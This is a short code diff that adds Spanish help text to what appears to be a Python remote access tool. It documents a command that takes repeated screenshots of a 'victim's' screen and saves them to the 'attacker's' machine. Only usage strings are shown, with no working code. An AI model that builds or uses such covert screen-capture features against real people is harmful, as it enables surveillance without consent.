@@ -117,6 +117,13 @@ def man():
     print(Fore.GREEN + "\t+ -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica la ruta de destino en la maquina de la victima (si no se agrega este parametro, el nombre del archivo no cambia)")
     print(Fore.MAGENTA + "\tsft -i origen.txt ~~ sft -i origen.txt -o destino.txt")
 
+    print(Fore.BLUE + "ss" + Fore.RED + " --> " + Fore.WHITE + "Toma capturas de la pantalla de la victima")
+    print(Fore.GREEN + "\t+ -d" + Fore.RED + " --> " + Fore.WHITE + "Directorio de la victima para guardar los archivos temporales")
+    print(Fore.GREEN + "\t+ -n" + Fore.RED + " --> " + Fore.WHITE + "Numero de capturas a tomar")
+    print(Fore.GREEN + "\t+ -o" + Fore.RED + " --> " + Fore.WHITE + "Directorio de destion en la maquina del atacante")
+    print(Fore.GREEN + "\t+ -t" + Fore.RED + " --> " + Fore.WHITE + "Tiempo de espera entre cada captura")
+    print(Fore.MAGENTA + "\tss ~~ ss -n 10 -t 1 ~~ ss -n 4 -t 5 -d inDir -o outDir")
+
     print(Fore.BLUE + "unzip" + Fore.RED + " --> " + Fore.WHITE + "Decomprime un archivo .zip")
     print(Fore.YELLOW + "\t* -i" + Fore.RED + " --> " + Fore.WHITE + "Especifica el archivo .zip de origen")
     print(Fore.GREEN + "\t+ -o" + Fore.RED + " --> " + Fore.WHITE + "Especifica el directorio destino")
